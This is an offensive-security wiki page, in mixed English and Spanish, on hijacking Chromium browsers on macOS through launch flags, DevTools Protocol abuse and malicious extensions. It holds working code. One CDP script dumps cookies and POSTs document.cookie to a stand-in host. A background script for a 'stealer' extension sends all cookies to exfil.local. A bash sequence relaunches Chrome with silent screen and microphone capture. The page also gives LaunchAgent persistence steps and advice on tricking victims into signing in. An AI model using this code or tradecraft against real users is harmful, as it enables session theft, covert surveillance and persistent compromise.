# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Información básica

Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera all consume the same command-line switches, preference files, and DevTools automation interfaces. On macOS, any user with GUI access can terminate an existing browser session and re-open it with arbitrary flags, extensions, or DevTools endpoints that run with the target's entitlements.

#### Launching Chromium with custom flags on macOS

macOS keeps a single UI instance per Chromium profile, so instrumentation normally requires force-closing the browser (for example with `osascript -e 'tell application "Google Chrome" to quit'`). Attackers typically relaunch via `open -na "Google Chrome" --args <flags>` so they can inject arguments without modifying the app bundle. Wrapping that command inside a user LaunchAgent (`~/Library/LaunchAgents/*.plist`) or login hook guarantees the tampered browser is respawned after reboot/logoff.

#### `--load-extension` Flag

The `--load-extension` flag auto-loads unpacked extensions (comma-separated paths). Pair it with `--disable-extensions-except` to block legitimate extensions while forcing only your payload to run. Malicious extensions can request high-impact permissions such as `debugger`, `webRequest`, and `cookies` to pivot into DevTools protocols, patch CSP headers, downgrade HTTPS, or exfiltrate session material as soon as the browser starts.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

These switches expose the Chrome DevTools Protocol (CDP) over TCP or a pipe so external tooling can drive the browser. Google observed widespread infostealer abuse of this interface and, beginning with Chrome 136 (March 2025), the switches are ignored for the default profile unless the browser is launched with a non-standard `--user-data-dir`. This enforces App-Bound Encryption on real profiles, but attackers can still spawn a fresh profile, coerce the victim to authenticate inside it (phishing/triage assistance), and harvest cookies, tokens, device trust states, or WebAuthn registrations via CDP.

#### `--user-data-dir` Flag

This flag redirects the entire browser profile (History, Cookies, Login Data, Preference files, etc.) to an attacker-controlled path. It is mandatory when combining modern Chrome builds with `--remote-debugging-port`, and it also keeps the tampered profile isolated so you can drop pre-populated `Preferences` or `Secure Preferences` files that disable security prompts, auto-install extensions, and change default schemes.

#### `--use-fake-ui-for-media-stream` Flag

This switch bypasses the camera/mic permission prompt so any page that calls `getUserMedia` receives access immediately. Combine it with flags such as `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, or CDP `Browser.grantPermissions` commands to silently capture audio/video, desk-share, or satisfy WebRTC permission checks without user interaction.

## Remote Debugging & DevTools Protocol Abuse

Once Chrome is relaunched with a dedicated `--user-data-dir` and `--remote-debugging-port`, you can attach over CDP (e.g., via `chrome-remote-interface`, `puppeteer`, or `playwright`) and script high-privilege workflows:

- **Robo de cookies/sesiones:** `Network.getAllCookies` and `Storage.getCookies` return HttpOnly values even when App-Bound encryption would normally block filesystem access, because CDP asks the running browser to decrypt them.
- **Manipulación de permisos:** `Browser.grantPermissions` and `Emulation.setGeolocationOverride` let you bypass camera/mic prompts (especially when combined with `--use-fake-ui-for-media-stream`) or falsify location-based security checks.
- **Inyección de pulsaciones/scripts:** `Runtime.evaluate` ejecuta JavaScript arbitrario dentro de la pestaña activa, permitiendo obtener credenciales, parchear el DOM o inyectar beacons de persistencia que sobreviven a la navegación.
- **Exfiltración en vivo:** `Network.webRequestWillBeSentExtraInfo` y `Fetch.enable` interceptan requests/responses autenticadas en tiempo real sin tocar artefactos en disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Porque Chrome 136 bloquea CDP en el perfil predeterminado, copiar/pegar el directorio existente `~/Library/Application Support/Google/Chrome` de la víctima a una ruta de staging ya no proporciona cookies descifradas. En su lugar, social-engineer al usuario para que se autentique dentro del perfil instrumentado (p. ej., una sesión de soporte "helpful") o captura tokens MFA en tránsito mediante hooks de red controlados por CDP.

## Extension-Based Injection via Debugger API

La investigación de 2023 "Chrowned by an Extension" demostró que una extensión maliciosa que usa la API `chrome.debugger` puede adjuntarse a cualquier pestaña y obtener los mismos poderes de DevTools que `--remote-debugging-port`. Eso rompe las suposiciones originales de aislamiento (las extensiones permanecen en su contexto) y permite:

- Robo silencioso de cookies y credenciales con `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modificación de permisos de sitio (camera, microphone, geolocation) y bypass de intersticiales de seguridad, permitiendo que páginas de phishing suplanten diálogos de Chrome.
- Manipulación on-path de advertencias TLS, descargas o prompts de WebAuthn conduciendo programáticamente `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, o `Security.handleCertificateError`.

Carga la extensión con `--load-extension`/`--disable-extensions-except` para que no se requiera interacción del usuario. Un background script mínimo que hace uso malicioso de la API se ve así:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
La extensión también puede suscribirse a eventos `Debugger.paused` para leer variables de JavaScript, parchear inline scripts o colocar breakpoints personalizados que sobreviven a la navegación. Como todo se ejecuta dentro de la sesión GUI del usuario, Gatekeeper y TCC no se activan, lo que hace que esta técnica sea ideal para malware que ya logró ejecución en el contexto del usuario.

### Herramientas

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza los lanzamientos de Chromium con extensiones de payload y expone hooks interactivos de CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Herramientas similares enfocadas en la intercepción de tráfico e instrumentación del navegador para operadores de macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteca de Node.js para automatizar dumps del Chrome DevTools Protocol (cookies, DOM, permissions) una vez que una instancia `--remote-debugging-port` esté activa.

### Ejemplo
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Encuentra más ejemplos en los enlaces de las herramientas.

## Referencias

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
